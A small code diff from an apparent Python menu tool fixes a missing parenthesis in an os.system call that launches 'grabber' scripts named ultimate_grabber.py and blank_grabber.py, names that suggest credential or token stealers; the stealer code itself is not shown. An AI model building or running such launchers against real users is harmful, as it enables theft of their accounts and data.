@@ -91,7 +91,7 @@ def grabbers():
        os.system('python ./data/grabber_scripts/ultimate_grabber.py')
   elif USER_OPTION2 == "3":
        clearcmd()
-       os.system('python ./data/grabber_scripts/blank_grabber.py'
+       os.system('python ./data/grabber_scripts/blank_grabber.py')
 
 def zyzz():
   print(bcolors.OKBLUE + "Today's date:",today)
